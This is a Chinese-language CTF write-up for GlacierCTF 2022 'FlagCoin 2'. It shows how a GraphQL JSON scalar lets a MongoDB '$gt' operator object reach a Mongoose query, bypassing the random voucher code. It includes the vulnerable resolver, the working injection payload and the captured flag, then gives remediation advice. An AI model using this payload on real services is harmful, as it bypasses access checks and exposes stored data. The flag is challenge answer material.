# GlacierCTF2022 - FlagCoin 2

## 题目简述

登录 FlagCoin 后可以提交兑换券。GraphQL 把 `voucher` 声明为任意 JSON，而 resolver 又把 `voucher.code` 原样放进 Mongoose 查询；目标是注入 MongoDB 查询运算符，绕过随机兑换码并取回保存在 voucher `message` 字段中的 flag。

## 解题过程

后端关键逻辑为：

```javascript
return db.Voucher.findOne({ code: voucher.code }).lean().exec()
  .then(dbvoucher => {
    user.coins += dbvoucher.coins;
    return dbvoucher;
  });
```

如果 `code` 被 GraphQL 强制为 String，输入会在 schema 层被拒绝；这里外层参数却使用 `GraphQLJSON`，所以可以令 `code` 本身成为对象。提交 MongoDB 的 `$gt` 运算符：

```graphql
mutation Redeem($voucher: JSON!) {
  redeem(voucher: $voucher) {
    coins
    message
  }
}
```

变量为：

```json
{
  "voucher": {
    "code": {"$gt": ""}
  }
}
```

最终查询变成 `findOne({code: {$gt: ""}})`，会匹配初始化时生成的任意非空随机兑换码。GraphQL 响应把该记录的 `message` 原样返回：

```text
glacierctf{th4nk_y0u_for_p4r7icip4ting_at_0ur_get_p00r_qu1ck_sch3m3}
```

## 方法总结

NoSQL 注入常由“结构化 JSON 直接进入查询对象”造成。GraphQL 并不会自动消除此风险，使用宽泛 JSON scalar 反而绕过了强类型优势。兑换码应声明为 String、验证标量类型与格式，并用显式等值查询构造，不能接受用户控制的运算符对象。
